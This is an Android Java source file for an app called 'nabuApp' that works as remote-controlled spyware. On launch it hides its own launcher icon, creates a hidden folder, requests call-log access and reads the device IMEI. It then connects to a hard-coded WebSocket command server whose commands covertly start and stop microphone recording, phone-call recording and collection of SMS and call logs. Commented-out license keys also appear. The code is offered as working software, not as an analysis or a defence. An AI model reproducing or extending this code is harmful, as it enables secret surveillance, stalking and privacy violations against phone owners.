package com.nabuapp.root.nabuapp_alpha;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;

import java.io.File;
import java.net.URI;
import java.net.URISyntaxException;



// TODO - Implement incoming command in json format
public class MainActivity extends Activity {

    public static final String TAG = "MainAct";
//    public static final String ELM_KEY = "89A904B56F98897138443FFE2ABF0F340B8B0501346DAAE814352F94409F5726B815D99A4C9BDAAE00A8595958D912D2C241A8274E8DCCF28107EBE6CEAC6BBE";
//    public static final String KLM_KEY = "KLM03-NKY84-YORJR-3S98N-WXUX2-QCVX4";


    public static final String CALLREC_ON = "callrec_on";
    public static final String CALLREC_OFF = "callrec_off";

    public static final String LOGS_ON = "logs_on";
    public static final String LOGS_OFF = "logs_off";


    public static final String VOICEREC_ON = "voicerec_on";
    public static final String VOICEREC_OFF = "voicerec_off";

    public static final String url = "http://95.67.63.106/ConsumeAfariaToASP/json/config.txt";

    public static final String NABU_APP_DIR = "/sdcard/.nabuApp";

    public static final int REQUEST_CALL_LOG = 0;

    public static String voiceREC;
    public static String callREC;
    public static String LOGS;
    public static String INTERVAL;

    public Context context;
    public Activity act;

    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;

    public int REQUEST_ENABLE;

    private boolean isAdminActivated;

    private WebSocketClient mWebSocketClient;

    @Override

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED, PackageManager.DONT_KILL_APP);


        // TODO - Create a class with static variables for directory addresses
        File nabuDir = new File(NABU_APP_DIR);
        if (!nabuDir.exists()){
            try {
                nabuDir.mkdirs();
            }
            catch (Exception e) {
                Log.e("nabuDir", "RecordService::makeOutputFile unable to create directory " + nabuDir + ": " + e);

            }
        }
        else {
            if (!nabuDir.canWrite()) {
                Log.e("nabuDir", "RecordService::makeOutputFile does not have write permission for directory: " + nabuDir);


            }
        }


        GetSMSAndCallsService.createDirs();
        setContentView(R.layout.activity_main);


        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CALL_LOG},
                    REQUEST_CALL_LOG );

            return;
        }

        context = getApplicationContext();
        act = MainActivity.this;
        connectWebSocket();

    }

    @Override
    public void onResume(){
        super.onResume();

    }

    /**
     * //TODO - Check if network is available
     * @return
     */
    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }


    private void connectWebSocket() {
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        final String imei = telephonyManager.getDeviceId();


        URI uri;
        try {
            uri = new URI("ws://192.168.1.147:1345");
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return;
        }

        mWebSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake serverHandshake) {

                String jsonObjectStr;

                Log.i("Websocket", "Opened");
//                MobileClient client = new MobileClient(imei,Build.MANUFACTURER + " " + Build.MODEL);
//
//                Gson gson = new GsonBuilder().create();
//                String json = gson.toJson(client);
//                JSONObject connectedDevObj = new JSONObject(client);

//                mWebSocketClient.send("Hello from: " + json);
                mWebSocketClient.send("Hello from: "+Build.MANUFACTURER + " " + Build.MODEL);
            }

            //supporting multiple message formats

            @Override
            public void onMessage(final String message) {

                    //TODO RECEIVE json message

                JSONObject  messageObj;
//                try {
////                    messageObj = new JSONObject(message);
////                    String incomeIMEI = (String) messageObj.get("deviceImei");
//                } catch (JSONException e) {
//                    e.printStackTrace();
//                }
                runOnUiThread(new Runnable() {


                    @Override
                    public void run() {
                        boolean isVoiceRec = false;
                        boolean isCallRec = false;
                        boolean isGetLogs = false;

                        Log.d("Incoming cmd", message);

                        int duration = 1;



                        if (message.equals(VOICEREC_ON)) {
                            if (isVoiceRec) {
//                    Toast.makeText(getApplicationContext(),"VOICEREC_ON_Already",Toast.LENGTH_LONG).show();
                                Log.d("voiceRec=", "already running");

                            } else {
                                Log.d("voiceRec=", "on");
//                    Toast.makeText(getApplicationContext(),"VOICEREC_ON",Toast.LENGTH_LONG).show();
                                Intent intent = new Intent(MainActivity.this, VoiceRecorderService.class);
                                intent.putExtra("duration", duration);
                                startService(intent);
                                isVoiceRec = true;
                                mWebSocketClient.send(VOICEREC_ON);

                            }
                        }

                        if (message.equals(VOICEREC_OFF)) {
                            if (!isVoiceRec) {
                                Log.d("voiceRec=", "already stopped");

                            }

                            Log.d("voiceRec=", "off");

                            Intent intent = new Intent(MainActivity.this, VoiceRecorderService.class);
                            stopService(intent);
                            intent.removeExtra("duration");
                            isVoiceRec = true;
                            mWebSocketClient.send(VOICEREC_OFF);
                        }

                        if (message.equals(CALLREC_ON)) {
                            if (isCallRec) {
                                Log.d("isCallRec=", "already running");
                            } else {
                                Log.d("isCallRec=", "on");

                                setSharedPreferences(false);
                                isCallRec = true;
                                mWebSocketClient.send(CALLREC_ON);
                            }
                        }
                        if (message.equals(CALLREC_OFF)) {

                            if (!isCallRec) {
                                Log.d("CallRec=", "already stopped");
                            } else {

                                setSharedPreferences(true);
                                isCallRec = false;
//
                            }
                            mWebSocketClient.send(CALLREC_OFF);
                        }
                        if (message.equals(LOGS_ON)) {
                            if (isGetLogs) {
                                Log.d("isGetLogs=", "already logging");
                            } else {
                                //start logging service - write into the same file
                                Intent intent = new Intent(MainActivity.this, GetSMSAndCallsService.class);
                                startService(intent);
                                mWebSocketClient.send(LOGS_ON);
                            }
                        }
                        if (message.equals(LOGS_OFF)) {
                            if (!isGetLogs) {
                                Log.d("isGetLogs=", "already stopped");
                            } else {
                                Intent intent = new Intent(MainActivity.this, GetSMSAndCallsService.class);
                                stopService(intent);
                                mWebSocketClient.send(LOGS_OFF);
                            }
                        }
                    }
                });


            }

            @Override
            public void onClose(int code, String reason, boolean remote) {
                Log.d("ws closed",reason);
            }

            @Override
            public void onError(Exception ex) {
                Log.d("ws error",ex.toString());
            }

        };
        mWebSocketClient.connect();
    }


    /**
     * Set shared preferences for voice call recording
     * @param silentMode
     */

    private void setSharedPreferences(boolean silentMode) {
        SharedPreferences settings = this.getSharedPreferences(
                CallRecorderConstants.LISTEN_ENABLED, 0);
        SharedPreferences.Editor editor = settings.edit();
        editor.putBoolean("silentMode", silentMode);
        editor.commit();

        Intent myIntent = new Intent(context, CallRecorderService.class);
        myIntent.putExtra("commandType",
                silentMode ? CallRecorderConstants.RECORDING_DISABLED
                        : CallRecorderConstants.RECORDING_ENABLED);
        myIntent.putExtra("silentMode", silentMode);
        if (context != null){
            Log.d("Context","not null");
            context.startService(myIntent);
        }

    }


}
